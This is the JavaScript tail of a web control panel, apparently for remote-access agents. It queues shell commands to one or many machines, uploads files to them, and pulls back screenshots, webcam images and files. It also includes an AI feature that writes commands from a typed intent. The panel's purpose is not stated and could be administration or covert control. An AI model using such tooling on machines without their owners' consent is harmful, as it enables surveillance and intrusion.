                    perAgentResults.push({agent: agent, ok: false, command_id: null, error: err.message});
                })
                .finally(() => {
                    completed++;
                    const okCount = perAgentResults.filter(r => r.ok).length;
                    statusLine.innerHTML = `<span class="terminal-status">Bulk queuing... ${completed}/${agents.length} (ok: ${okCount})</span>`;
                    terminal.scrollTop = terminal.scrollHeight;

                    if (completed === agents.length) {
                        const okCountFinal = perAgentResults.filter(r => r.ok).length;
                        const firstIds = perAgentResults
                            .filter(r => r.ok && r.command_id)
                            .slice(0, 5)
                            .map(r => `${escapeHtml(r.agent)}#${r.command_id}`)
                            .join(', ');

                        statusLine.innerHTML = `<span class="terminal-status">Bulk queued: ${okCountFinal}/${agents.length}${firstIds ? ` (e.g. ${firstIds})` : ''}</span>`;
                        document.getElementById('statusText').textContent = `Bulk queued: ${okCountFinal}/${agents.length}. Check each agent output after execution.`;
                        if (input) input.value = '';

                        // Start bulk results viewer (Option A)
                        startBulkResultsViewer(perAgentResults);
                    }
                });
            });
        }

        let bulkViewerInterval = null;
        let bulkViewerExpiresAt = 0;

        function startBulkResultsViewer(perAgentResults) {
            stopBulkResultsViewer();

            const rows = perAgentResults
                .filter(r => r.ok && r.command_id)
                .map(r => ({ agent: r.agent, command_id: r.command_id, status: 'pending', output: '', error: '' }));

            renderBulkResults(rows);
            bulkViewerExpiresAt = Date.now() + (2 * 60 * 1000); // auto-stop after 2 minutes

            const tick = () => {
                if (Date.now() > bulkViewerExpiresAt) {
                    stopBulkResultsViewer();
                    return;
                }

                Promise.all(rows.map(r => {
                    return fetch(`${BASE_PATH}/api/remote-access.php?action=get_command_result&command_id=${encodeURIComponent(r.command_id)}`)
                        .then(resp => resp.json())
                        .then(data => {
                            if (!data) return;
                            r.status = data.status || r.status;
                            r.output = (data.output || '').toString();
                            r.error = (data.error || '').toString();
                        })
                        .catch(() => {});
                })).then(() => {
                    renderBulkResults(rows);

                    const done = rows.every(r => {
                        const s = (r.status || '').toLowerCase();
                        return s !== 'pending';
                    });
                    if (done) {
                        stopBulkResultsViewer();
                    }
                });
            };

            tick();
            bulkViewerInterval = setInterval(tick, 2000);
        }

        function stopBulkResultsViewer() {
            if (bulkViewerInterval) {
                clearInterval(bulkViewerInterval);
                bulkViewerInterval = null;
            }
        }

        function renderBulkResults(rows) {
            const container = document.getElementById('bulkResults');
            const body = document.getElementById('bulkResultsBody');
            if (!container || !body) return;

            container.style.display = rows && rows.length ? 'block' : 'none';
            body.innerHTML = '';

            (rows || []).forEach(r => {
                const tr = document.createElement('tr');
                const status = (r.status || 'pending').toString();
                const statusClass = status.toLowerCase();
                const preview = ((r.error && r.error.trim()) ? `ERROR: ${r.error}` : (r.output || '')).toString();
                const previewShort = preview.length > 400 ? (preview.substring(0, 400) + '...') : preview;

                tr.innerHTML = `
                    <td>${escapeHtml(r.agent)}</td>
                    <td>${escapeHtml(String(r.command_id))}</td>
                    <td><span class="bulk-pill ${escapeHtml(statusClass)}">${escapeHtml(status)}</span></td>
                    <td><div class="bulk-output">${escapeHtml(previewShort)}</div></td>
                    <td>
                        <button class="btn btn-clear" style="height: 30px; padding: 6px 10px;" onclick="selectAgent('${escapeJs(r.agent)}')">Open</button>
                    </td>
                `;
                body.appendChild(tr);
            });
        }

        function escapeJs(s) {
            return String(s)
                .replace(/\\/g, '\\\\')
                .replace(/\"/g, '\\"')
                .replace(/\'/g, "\\'")
                .replace(/\n/g, '\\n')
                .replace(/\r/g, '\\r')
                .replace(/\t/g, '\\t');
        }

        function uploadFileToAgent() {
            if (!selectedAgent) {
                alert('Please select an agent first');
                return;
            }

            const fileInput = document.getElementById('uploadFile');
            const destInput = document.getElementById('uploadDest');
            const f = (fileInput && fileInput.files && fileInput.files[0]) ? fileInput.files[0] : null;
            const dest = (destInput ? destInput.value.trim() : '');

            if (!f) {
                alert('Please choose a file');
                return;
            }
            if (!dest) {
                alert('Please enter destination path');
                return;
            }

            const terminal = document.getElementById('terminal');
            const line = document.createElement('div');
            line.className = 'terminal-line';
            line.innerHTML = `<span class="terminal-prompt">$</span> <span class="terminal-input">upload:${escapeHtml(dest)} (${escapeHtml(f.name)})</span>`;
            terminal.appendChild(line);

            const statusLine = document.createElement('div');
            statusLine.className = 'terminal-line';
            statusLine.innerHTML = `<span class="terminal-status">Uploading...</span>`;
            terminal.appendChild(statusLine);
            terminal.scrollTop = terminal.scrollHeight;

            const form = new FormData();
            form.append('dest', dest);
            form.append('file', f, f.name);

            fetch(`${BASE_PATH}/api/direct-command.php?action=upload&agent=${encodeURIComponent(selectedAgent)}`, {
                method: 'POST',
                body: form
            })
            .then(r => r.json())
            .then(data => {
                if (data.status === 'ok') {
                    const commandId = data.command_id;
                    statusLine.innerHTML = `<span class="terminal-status">Queued upload (ID: ${commandId}). Waiting for agent...</span>`;
                    document.getElementById('statusText').textContent = `Upload queued (ID: ${commandId}). Waiting for agent response...`;
                    try {
                        destInput.value = '';
                        fileInput.value = '';
                    } catch (e) {}
                    pollForCommandResult(commandId, statusLine);
                } else {
                    statusLine.innerHTML = `<span class="terminal-error">Error: ${data.error || 'Unknown error'}</span>`;
                    document.getElementById('statusText').textContent = `Error: ${data.error || 'Unknown error'}`;
                }
            })
            .catch(err => {
                statusLine.innerHTML = `<span class="terminal-error">Error: ${err.message}</span>`;
                document.getElementById('statusText').textContent = `Error: ${err.message}`;
            });
        }

        function selectAgent(agent, ev) {
            selectedAgent = agent;
            document.querySelectorAll('.agent-item').forEach(el => el.classList.remove('active'));
            if (ev && ev.target) {
                ev.target.closest('.agent-item')?.classList.add('active');
            }
            
            document.getElementById('agentInfo').textContent = `Connected to: ${agent}`;
            document.getElementById('statusText').textContent = `Connected to ${agent}. Ready to execute commands.`;
            
            clearTerminal();
            loadCommandHistory();

            // If a command is provided via URL, prefill it (do not auto-execute)
            if (typeof PREFILL_CMD === 'string' && PREFILL_CMD.trim()) {
                const input = document.getElementById('commandInput');
                if (input) {
                    input.value = PREFILL_CMD;
                    input.focus();
                }
            }
        }
        
        function executeCommand() {
            const input = document.getElementById('commandInput');
            const command = input.value.trim();
            
            if (!command) {
                alert('Please enter a command');
                return;
            }
            
            if (!selectedAgent) {
                alert('Please select an agent first');
                return;
            }
            
            // Add to history
            if (!commandHistory.includes(command)) {
                commandHistory.unshift(command);
                if (commandHistory.length > 20) commandHistory.pop();
            }
            
            // Display command
            const terminal = document.getElementById('terminal');
            const line = document.createElement('div');
            line.className = 'terminal-line';
            line.innerHTML = `<span class="terminal-prompt">$</span> <span class="terminal-input">${escapeHtml(command)}</span>`;
            terminal.appendChild(line);
            
            // Show executing status
            const statusLine = document.createElement('div');
            statusLine.className = 'terminal-line';
            statusLine.id = 'status-' + Date.now();
            statusLine.innerHTML = `<span class="terminal-status">Executing...</span>`;
            terminal.appendChild(statusLine);
            
            // Scroll to bottom
            terminal.scrollTop = terminal.scrollHeight;
            
            // Send command to queue API
            fetch(`${BASE_PATH}/api/direct-command.php?action=execute&agent=${encodeURIComponent(selectedAgent)}`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command: 'rt:' + command})
            })
            .then(r => r.json())
            .then(data => {
                if (data.status === 'ok') {
                    // Command queued successfully
                    const commandId = data.command_id;
                    document.getElementById('statusText').textContent = `Command queued (ID: ${commandId}). Waiting for agent response...`;
                    input.value = '';
                    
                    // Start polling for results
                    pollForCommandResult(commandId, statusLine);
                } else {
                    statusLine.innerHTML = `<span class="terminal-error">Error: ${data.error || 'Unknown error'}</span>`;
                    document.getElementById('statusText').textContent = `Error: ${data.error}`;
                }
            })
            .catch(err => {
                statusLine.innerHTML = `<span class="terminal-error">Error: ${err.message}</span>`;
                document.getElementById('statusText').textContent = `Error: ${err.message}`;
            });
        }
        
        function pollForCommandResult(commandId, statusLine) {
            const terminal = document.getElementById('terminal');
            let pollCount = 0;
            const maxPolls = 60; // Poll for max 60 seconds (1 second interval)
            
            const pollInterval = setInterval(() => {
                pollCount++;
                
                // Fetch command result from database
                fetch(`${BASE_PATH}/api/remote-access.php?action=get_command_result&command_id=${commandId}`)
                    .then(r => r.json())
                    .then(data => {
                        if (data.status === 'completed' || data.status === 'success' || data.status === 'failed' || data.status === 'error') {
                            // Command completed
                            clearInterval(pollInterval);
                            statusLine.remove();
                            
                            // Check for screenshot marker
                            let handled = false;
                            if (data.output && data.output.includes('###SCREENSHOT###')) {
                                const startIdx = data.output.indexOf('###SCREENSHOT###|');
                                const endIdx = data.output.indexOf('###END_SCREENSHOT###');
                                
                                if (startIdx !== -1 && endIdx !== -1) {
                                    handled = true;
                                    const screenshotData = data.output.substring(startIdx + 17, endIdx);
                                    
                                    // Display screenshot image (JPEG format)
                                    const img = document.createElement('img');
                                    const previewUrl = base64ToObjectUrl(screenshotData, 'image/jpeg');
                                    img.src = previewUrl;
                                    img.style.maxWidth = '100%';
                                    img.style.maxHeight = '400px';
                                    img.style.marginTop = '10px';
                                    img.style.border = '1px solid #333';
                                    img.style.cursor = 'pointer';
                                    img.title = 'Click to download screenshot';
                                    img.onclick = () => {
                                        downloadBase64File(screenshotData, `screenshot_${Date.now()}.jpg`, 'image/jpeg');
                                    };
                                    terminal.appendChild(img);
                                }
                            }

                            // Check for webcam marker
                            if (!handled && data.output && data.output.includes('###WEBCAM###')) {
                                const startIdx = data.output.indexOf('###WEBCAM###|');
                                const endIdx = data.output.indexOf('###END_WEBCAM###');

                                if (startIdx !== -1 && endIdx !== -1) {
                                    handled = true;
                                    const webcamData = (data.output.substring(startIdx + 11, endIdx) || '').trim();

                                    const img = document.createElement('img');
                                    const previewUrl = base64ToObjectUrl(webcamData, 'image/jpeg');
                                    img.src = previewUrl;
                                    img.style.maxWidth = '100%';
                                    img.style.maxHeight = '400px';
                                    img.style.marginTop = '10px';
                                    img.style.border = '1px solid #333';
                                    img.style.cursor = 'pointer';
                                    img.title = 'Click to download webcam image';
                                    img.onclick = () => {
                                        downloadBase64File(webcamData, `webcam_${Date.now()}.jpg`, 'image/jpeg');
                                    };
                                    terminal.appendChild(img);
                                }
                            }
                            
                            // Check for file download marker
                            if (!handled && data.output && data.output.includes('###FILE_DOWNLOAD###')) {
                                const startIdx = data.output.indexOf('###FILE_DOWNLOAD###|');
                                const endIdx = data.output.indexOf('###END_FILE###');
                                
                                if (startIdx !== -1 && endIdx !== -1) {
                                    handled = true;
                                    const headerEnd = data.output.indexOf('|', startIdx + 20);
                                    const sizeEnd = data.output.indexOf('|', headerEnd + 1);
                                    
                                    const filename = data.output.substring(startIdx + 20, headerEnd);
                                    const filesize = data.output.substring(headerEnd + 1, sizeEnd);
                                    const filedata = data.output.substring(sizeEnd + 1, endIdx);
                                    
                                    // Create download button and trigger download
                                    const downloadBtn = document.createElement('button');
                                    downloadBtn.className = 'btn';
                                    downloadBtn.textContent = `⬇ Download ${filename}`;
                                    downloadBtn.style.marginTop = '10px';
                                    downloadBtn.onclick = () => {
                                        const link = document.createElement('a');
                                        link.href = 'data:application/octet-stream;base64,' + filedata;
                                        link.download = filename;
                                        link.click();
                                    };
                                    terminal.appendChild(downloadBtn);
                                    
                                    // Auto-trigger download
                                    setTimeout(() => downloadBtn.click(), 500);
                                }
                            }
                            
                            // Display output if not handled as special marker
                            if (!handled && data.output) {
                                const outputLines = data.output.split('\n');
                                outputLines.forEach(line => {
                                    if (line.trim()) {
                                        const outputLine = document.createElement('div');
                                        outputLine.className = 'terminal-line terminal-output';
                                        outputLine.textContent = line;
                                        terminal.appendChild(outputLine);
                                    }
                                });
                            }
                            
                            // Display error if any
                            if (data.error) {
                                const errorLines = data.error.split('\n');
                                errorLines.forEach(line => {
                                    if (line.trim()) {
                                        const errorLine = document.createElement('div');
                                        errorLine.className = 'terminal-line terminal-error';
                                        errorLine.textContent = line;
                                        terminal.appendChild(errorLine);
                                    }
                                });
                            }
                            
                            // Add prompt
                            const promptLine = document.createElement('div');
                            promptLine.className = 'terminal-line';
                            promptLine.innerHTML = `<span class="terminal-prompt">$</span>`;
                            terminal.appendChild(promptLine);
                            
                            document.getElementById('statusText').textContent = 'Command completed.';
                            terminal.scrollTop = terminal.scrollHeight;
                        } else if (pollCount >= maxPolls) {
                            // Timeout
                            clearInterval(pollInterval);
                            statusLine.innerHTML = `<span class="terminal-error">Command timeout - agent did not respond</span>`;
                            document.getElementById('statusText').textContent = 'Command timeout.';
                        }
                    })
                    .catch(err => {
                        if (pollCount >= maxPolls) {
                            clearInterval(pollInterval);
                            statusLine.innerHTML = `<span class="terminal-error">Error polling results: ${err.message}</span>`;
                        }
                    });
            }, 1000); // Poll every 1 second
        }
        
        function pollCommandResults(command) {
            // Poll for command results - works with persistent shell
            let lastCommandId = null;
            const pollInterval = setInterval(() => {
                fetch(`${BASE_PATH}/api/remote-access.php?action=get_command_results&agent=${selectedAgent}`)
                    .then(r => r.json())
                    .then(data => {
                        if (data.commands && data.commands.length > 0) {
                            const cmd = data.commands[0];
                            
                            // Check if this is a new command result (not pending)
                            if (cmd.status !== 'pending' && (lastCommandId === null || cmd.id !== lastCommandId)) {
                                lastCommandId = cmd.id;
                                clearInterval(pollInterval);
                                
                                const terminal = document.getElementById('terminal');
                                
                                // Remove status line
                                const statusLines = terminal.querySelectorAll('[id^="status-"]');
                                statusLines.forEach(el => el.remove());
                                
                                // Check for screenshot marker FIRST (before splitting lines)
                                let handled = false;
                                if (cmd.output && cmd.output.includes('###SCREENSHOT###')) {
                                    // Extract screenshot data between markers
                                    const startIdx = cmd.output.indexOf('###SCREENSHOT###|');
                                    const endIdx = cmd.output.indexOf('###END_SCREENSHOT###');
                                    
                                    if (startIdx !== -1 && endIdx !== -1) {
                                        handled = true;
                                        const screenshotData = cmd.output.substring(startIdx + 17, endIdx);
                                        
                                        // Display other output (before the marker)
                                        const beforeMarker = cmd.output.substring(0, startIdx);
                                        if (beforeMarker.trim()) {
                                            const beforeLines = beforeMarker.split('\n');
                                            beforeLines.forEach(line => {
                                                if (line.trim()) {
                                                    const outputLine = document.createElement('div');
                                                    outputLine.className = 'terminal-line terminal-output';
                                                    outputLine.textContent = line;
                                                    terminal.appendChild(outputLine);
                                                }
                                            });
                                        }
                                        
                                        // Display screenshot image (JPEG format)
                                        const img = document.createElement('img');
                                        img.src = 'data:image/jpeg;base64,' + screenshotData;
                                        img.style.maxWidth = '100%';
                                        img.style.maxHeight = '400px';
                                        img.style.marginTop = '10px';
                                        img.style.border = '1px solid #333';
                                        img.style.cursor = 'pointer';
                                        img.title = 'Click to download screenshot';
                                        img.onclick = () => {
                                            const link = document.createElement('a');
                                            link.href = img.src;
                                            link.download = `screenshot_${Date.now()}.jpg`;
                                            link.click();
                                        };
                                        terminal.appendChild(img);
                                    }
                                }
                                
                                if (!handled && cmd.output && cmd.output.includes('###FILE_DOWNLOAD###')) {
                                    // Extract file data between markers
                                    const startIdx = cmd.output.indexOf('###FILE_DOWNLOAD###|');
                                    const endIdx = cmd.output.indexOf('###END_FILE###');
                                    
                                    if (startIdx !== -1 && endIdx !== -1) {
                                        handled = true;
                                        const headerEnd = cmd.output.indexOf('|', startIdx + 20);
                                        const sizeEnd = cmd.output.indexOf('|', headerEnd + 1);
                                        
                                        const filename = cmd.output.substring(startIdx + 20, headerEnd);
                                        const filesize = cmd.output.substring(headerEnd + 1, sizeEnd);
                                        const filedata = cmd.output.substring(sizeEnd + 1, endIdx);
                                        
                                        // Display other output (before the marker)
                                        const beforeMarker = cmd.output.substring(0, startIdx);
                                        if (beforeMarker.trim()) {
                                            const beforeLines = beforeMarker.split('\n');
                                            beforeLines.forEach(line => {
                                                if (line.trim()) {
                                                    const outputLine = document.createElement('div');
                                                    outputLine.className = 'terminal-line terminal-output';
                                                    outputLine.textContent = line;
                                                    terminal.appendChild(outputLine);
                                                }
                                            });
                                        }
                                        
                                        // Create download button and trigger download
                                        const downloadBtn = document.createElement('button');
                                        downloadBtn.className = 'btn';
                                        downloadBtn.textContent = `⬇ Download ${filename}`;
                                        downloadBtn.style.marginTop = '10px';
                                        downloadBtn.onclick = () => {
                                            const link = document.createElement('a');
                                            link.href = 'data:application/octet-stream;base64,' + filedata;
                                            link.download = filename;
                                            link.click();
                                        };
                                        terminal.appendChild(downloadBtn);
                                        
                                        // Auto-trigger download
                                        setTimeout(() => downloadBtn.click(), 500);
                                    }
                                }
                                
                                if (!handled && cmd.output) {
                                    // Normal output - handle multi-line output
                                    const outputLines = cmd.output.split('\n');
                                    outputLines.forEach(line => {
                                        if (line.trim()) {
                                            const outputLine = document.createElement('div');
                                            outputLine.className = 'terminal-line terminal-output';
                                            outputLine.textContent = line;
                                            terminal.appendChild(outputLine);
                                        }
                                    });
                                }
                                
                                // Add error if any
                                if (cmd.error) {
                                    const errorLines = cmd.error.split('\n');
                                    errorLines.forEach(line => {
                                        if (line.trim()) {
                                            const errorLine = document.createElement('div');
                                            errorLine.className = 'terminal-line terminal-error';
                                            errorLine.textContent = line;
                                            terminal.appendChild(errorLine);
                                        }
                                    });
                                }
                                
                                // Add prompt
                                const promptLine = document.createElement('div');
                                promptLine.className = 'terminal-line';
                                promptLine.innerHTML = `<span class="terminal-prompt">$</span>`;
                                terminal.appendChild(promptLine);
                                
                                terminal.scrollTop = terminal.scrollHeight;
                                document.getElementById('statusText').textContent = `Command completed.`;
                            }
                        }
                    });
            }, 500);
            
            // Stop polling after 30 seconds
            setTimeout(() => clearInterval(pollInterval), 30000);
        }
        
        function loadCommandHistory() {
            const historyDiv = document.getElementById('commandHistory');
            historyDiv.innerHTML = '';
            
            commandHistory.slice(0, 5).forEach(cmd => {
                const btn = document.createElement('button');
                btn.className = 'history-btn';
                btn.textContent = cmd;
                btn.onclick = () => {
                    document.getElementById('commandInput').value = cmd;
                    document.getElementById('commandInput').focus();
                };
                historyDiv.appendChild(btn);
            });
        }
        
        function clearTerminal() {
            document.getElementById('terminal').innerHTML = '<div class="terminal-line terminal-prompt">$ Ready</div>';
        }
        
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function forceCleanupAgent() {
            if (!selectedAgent) {
                alert('Please select an agent first');
                return;
            }

            const older = 60;
            document.getElementById('statusText').textContent = 'Force cleaning pending commands (agent)...';
            fetch(`${BASE_PATH}/api/command-recovery.php?action=cleanup_agent&agent=${encodeURIComponent(selectedAgent)}&older_than=${older}`)
                .then(r => r.json())
                .then(data => {
                    if (data.status !== 'ok') {
                        throw new Error(data.error || 'Cleanup failed');
                    }
                    document.getElementById('statusText').textContent = `Cleanup complete (agent). Cleared: ${data.affected}`;
                })
                .catch(err => {
                    document.getElementById('statusText').textContent = `Cleanup error: ${err.message}`;
                });
        }

        function forceCleanupAll() {
            const older = 120;
            document.getElementById('statusText').textContent = 'Force cleaning pending commands (all agents)...';
            fetch(`${BASE_PATH}/api/command-recovery.php?action=cleanup_all&older_than=${older}`)
                .then(r => r.json())
                .then(data => {
                    if (data.status !== 'ok') {
                        throw new Error(data.error || 'Cleanup failed');
                    }
                    document.getElementById('statusText').textContent = `Cleanup complete (all). Cleared: ${data.affected}`;
                })
                .catch(err => {
                    document.getElementById('statusText').textContent = `Cleanup error: ${err.message}`;
                });
        }
        
        function downloadFile(filename, base64data) {
            try {
                // Decode base64 to binary
                const binaryString = atob(base64data);
                const bytes = new Uint8Array(binaryString.length);
                for (let i = 0; i < binaryString.length; i++) {
                    bytes[i] = binaryString.charCodeAt(i);
                }
                
                // Create blob and download
                const blob = new Blob([bytes], { type: 'application/octet-stream' });
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = filename;
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);
            } catch (err) {
                alert('Error downloading file: ' + err.message);
            }
        }
        
        function showHelp() {
            document.getElementById('helpPanel').style.display = 'block';
        }
        
        function closeHelp() {
            document.getElementById('helpPanel').style.display = 'none';
        }
        
        // Close help panel when clicking outside
        document.getElementById('helpPanel').addEventListener('click', (e) => {
            if (e.target.id === 'helpPanel') {
                closeHelp();
            }
        });

        function openAiCrafter() {
            document.getElementById('aiCrafterPanel').style.display = 'block';
            const i = document.getElementById('aiIntent');
            if (i) {
                i.value = '';
                i.focus();
            }
            document.getElementById('aiSuggested').value = '';
            document.getElementById('aiExplain').textContent = '';
            document.getElementById('aiWarnings').textContent = '';
            document.getElementById('aiStatus').textContent = '';
        }

        function closeAiCrafter() {
            document.getElementById('aiCrafterPanel').style.display = 'none';
        }

        document.getElementById('aiCrafterPanel').addEventListener('click', (e) => {
            if (e.target.id === 'aiCrafterPanel') {
                closeAiCrafter();
            }
        });

        function craftAiCommand() {
            if (!selectedAgent) {
                alert('Please select an agent first');
                return;
            }
            const intentEl = document.getElementById('aiIntent');
            const intent = (intentEl ? intentEl.value.trim() : '');
            if (!intent) {
                alert('Please enter an intent');
                return;
            }

            document.getElementById('aiStatus').textContent = 'Generating...';
            document.getElementById('aiWarnings').textContent = '';
            document.getElementById('aiExplain').textContent = '';

            fetch(`${BASE_PATH}/api/ai-command-crafter.php`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    agent: selectedAgent,
                    intent: intent,
                    context: {
                        terminal_prefix: 'rt:',
                        selected_agent: selectedAgent
                    }
                })
            })
            .then(r => r.json())
            .then(data => {
                if (!data || data.success !== true) {
                    throw new Error((data && data.error) ? data.error : 'AI craft failed');
                }
                const cmd = (data.suggested_command || '').trim();
                document.getElementById('aiSuggested').value = cmd;
                document.getElementById('aiExplain').textContent = data.explanation ? String(data.explanation) : '';

                const warns = Array.isArray(data.warnings) ? data.warnings : [];
                document.getElementById('aiWarnings').textContent = warns.length ? ('Warnings: ' + warns.join(' | ')) : '';
                document.getElementById('aiStatus').textContent = 'Ready.';
            })
            .catch(err => {
                document.getElementById('aiStatus').textContent = 'Error: ' + err.message;
            });
        }

        function useAiCommand() {
            const cmd = (document.getElementById('aiSuggested').value || '').trim();
            if (!cmd) {
                alert('No suggested command');
                return;
            }
            const input = document.getElementById('commandInput');
            input.value = cmd;
            input.focus();
            closeAiCrafter();
        }

        function executeAiCommand() {
            const cmd = (document.getElementById('aiSuggested').value || '').trim();
            if (!cmd) {
                alert('No suggested command');
                return;
            }
            const input = document.getElementById('commandInput');
            input.value = cmd;
            closeAiCrafter();
            executeCommand();
        }
        
        // Allow Enter key to execute command
        document.getElementById('commandInput').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                executeCommand();
            }
        });
        
        // Refresh agents every 10 seconds
        setInterval(loadAgents, 10000);
    </script>
</body>
</html>
